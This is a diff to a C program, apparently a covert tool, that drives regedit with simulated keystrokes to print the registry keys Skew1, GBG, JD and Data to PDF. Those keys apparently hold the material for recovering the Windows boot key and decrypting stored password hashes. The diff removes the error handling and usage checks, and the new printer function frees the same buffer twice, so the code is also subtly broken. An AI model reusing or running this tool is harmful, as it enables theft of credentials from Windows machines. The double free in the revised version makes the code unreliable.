@@ -12,7 +12,7 @@ void SendKey(WORD key) {
     SendInput(1, &input, sizeof(INPUT));
 }
 
-BOOL SendCtrlP() {
+void SendCtrlP() {
     INPUT inputs[4] = { 0 };
 
     inputs[0].type = INPUT_KEYBOARD;
@@ -30,10 +30,7 @@ BOOL SendCtrlP() {
     inputs[3].type = INPUT_KEYBOARD;
     inputs[3].ki.wVk = VK_CONTROL;
     inputs[3].ki.dwFlags = KEYEVENTF_KEYUP;
-    if (SendInput(4, inputs, sizeof(INPUT) == 0))
-        return FALSE;
-    else
-        return TRUE;
+    SendInput(4, inputs, sizeof(INPUT));
 }
 
 void SendString(const char* str, int layout) {
@@ -41,29 +38,28 @@ void SendString(const char* str, int layout) {
         if (*p == '&') {
             INPUT input[2] = { 0 };
             input[0].type = INPUT_KEYBOARD;
-            input[0].ki.wVk = 0;
+            input[0].ki.wVk = 0; 
             input[0].ki.wScan = layout == 2 ? 0x26 : 0x31; // '&' for QWERTY, '1' for AZERTY
-            input[0].ki.dwFlags = KEYEVENTF_UNICODE;
+            input[0].ki.dwFlags = KEYEVENTF_UNICODE;  
 
             SendInput(1, &input[0], sizeof(INPUT));
             Sleep(100);
 
-            input[0].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
+             input[0].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;  
             SendInput(1, &input[0], sizeof(INPUT));
-        }
-        else {
+        } else {
             SHORT key = VkKeyScan(*p);
             SendKey(LOBYTE(key));
         }
-        Sleep(50);
+        Sleep(50); 
     }
 }
 void SendBackslash(int layout) {
     INPUT input[2] = { 0 };
     input[0].type = INPUT_KEYBOARD;
-    input[0].ki.wVk = 0;
-    input[0].ki.wScan = layout == 2 ? VK_OEM_5 : 0x5C;
-    input[0].ki.dwFlags = KEYEVENTF_UNICODE;
+    input[0].ki.wVk = 0;  
+    input[0].ki.wScan = layout == 2 ? VK_OEM_5 : 0x5C; 
+    input[0].ki.dwFlags = KEYEVENTF_UNICODE; 
     SendInput(1, &input[0], sizeof(INPUT));
     Sleep(100);
     input[0].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
@@ -71,12 +67,12 @@ void SendBackslash(int layout) {
 }
 
 
-BOOL SendToRegeditAndSaveAsPDF(const char* keyName, int layout) {
+void SendToRegeditAndSaveAsPDF(const char* keyName, int layout) {
     STARTUPINFO si = { sizeof(si) };
     PROCESS_INFORMATION pi;
     if (!CreateProcess(TEXT("C:\\Windows\\regedit.exe"), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
         printf("Erreur lors du lancement de regedit.exe\n");
-        return FALSE;
+        return;
     }
     Sleep(1000);
     SendKey(VK_TAB);
@@ -100,9 +96,7 @@ BOOL SendToRegeditAndSaveAsPDF(const char* keyName, int layout) {
     SendKey(VK_RETURN);
     Sleep(100);
 
-    if (!SendCtrlP())
-        return FALSE;
-
+    SendCtrlP();
     Sleep(100);
 
     for (int i = 0; i < 6; i++) {
@@ -119,23 +113,17 @@ BOOL SendToRegeditAndSaveAsPDF(const char* keyName, int layout) {
     SendKey(VK_RETURN);
     Sleep(100);
 
-    if (!CloseHandle(pi.hProcess))
-        return FALSE;
-
-    if (!CloseHandle(pi.hThread))
-        return FALSE;
-
-    return TRUE;
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 }
 
-BOOL SetMicrosoftPrintToPDFPrinter() {
+void SetMicrosoftPrintToPDFPrinter() {
     const wchar_t printerName[] = L"Microsoft Print To PDF";
     HANDLE hPrinter = NULL;
-    BOOL ret = FALSE;
-    DWORD needed, returned;
 
+    DWORD needed, returned;
     EnumPrinters(PRINTER_ENUM_LOCAL, NULL, 2, NULL, 0, &needed, &returned);
-    PPRINTER_INFO_2W pPrinterInfo = (PPRINTER_INFO_2W)malloc(needed);
+    PRINTER_INFO_2* pPrinterInfo = (PRINTER_INFO_2*)malloc(needed);
     EnumPrinters(PRINTER_ENUM_LOCAL, NULL, 2, (LPBYTE)pPrinterInfo, needed, &needed, &returned);
 
     for (DWORD i = 0; i < returned; i++) {
@@ -148,54 +136,32 @@ BOOL SetMicrosoftPrintToPDFPrinter() {
             if (OpenPrinter(pPrinterInfo[i].pPrinterName, &hPrinter, NULL)) {
                 SetDefaultPrinter(pPrinterInfo[i].pPrinterName);
                 ClosePrinter(hPrinter);
-            }
-            else {
+            } else {
                 printf("Failed to open printer\n");
-                goto end;
+                free(pPrinterInfo);
             }
 
             break;
         }
     }
 
-    end:
     free(pPrinterInfo);
-
-    return ret;
 }
 
 int main(int argc, char* argv[]) {
     int layout = 1; // Par défaut, AZERTY
-    if (argc > 1 && argc < 3) {
+    if (argc > 1) {
         int arg = atoi(argv[1]);
         if (arg == 2) {
             layout = 2; // QWERTY
         }
     }
-    else
-    {
-        printf("[!] Commande exemple : get_pdf.exe 1 or get_pdf.exe 2\n1 for AZERTY keyboard\n2 for QWERTY keyboard\n");
-        goto fail;
-    }
 
+    SetMicrosoftPrintToPDFPrinter();
+    SendToRegeditAndSaveAsPDF("Skew&", layout);
+    SendToRegeditAndSaveAsPDF("GBG", layout);
+    SendToRegeditAndSaveAsPDF("JD", layout);
+    SendToRegeditAndSaveAsPDF("DATA", layout);
 
-    if (!SetMicrosoftPrintToPDFPrinter())
-        goto fail;
-
-    if (!SendToRegeditAndSaveAsPDF("Skew&", layout))
-        goto fail;
-
-    if(!SendToRegeditAndSaveAsPDF("GBG", layout))
-        goto fail;
-
-    if(!SendToRegeditAndSaveAsPDF("JD", layout))
-        goto fail;
-    if(!SendToRegeditAndSaveAsPDF("DATA", layout))
-        goto fail;
-
-    return EXIT_SUCCESS;
-
-fail:
-    printf("[!] Error during the execution of tools !\n");
-    return EXIT_FAILURE;
+    return 0;
 }
